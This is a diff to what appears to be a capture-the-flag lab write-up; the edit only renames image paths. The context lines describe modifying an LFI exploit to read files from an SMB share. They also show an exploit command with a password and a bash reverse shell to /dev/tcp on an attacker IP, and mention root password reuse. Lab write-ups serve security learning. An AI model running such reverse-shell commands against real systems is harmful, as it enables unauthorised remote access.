@@ -124,7 +124,7 @@ There was something blocking us from reading PHP files here, and its probably th
 
 The LFI exploit copies and pastes files into directories, and this means that we should be able to read the file from the SMB share. We just need to modify the `paste_clipboard` function within the exploit:
 
-<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (21) (9).png" alt=""><figcaption></figcaption></figure>
 
 After changing the directories a few times, I got it within the SMB share:
 
@@ -203,4 +203,4 @@ $ python2 45161.py -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.184/
 
 The `root` user has the same password as the MySQL database of `thedoctor`:
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14) (2).png" alt=""><figcaption></figcaption></figure>
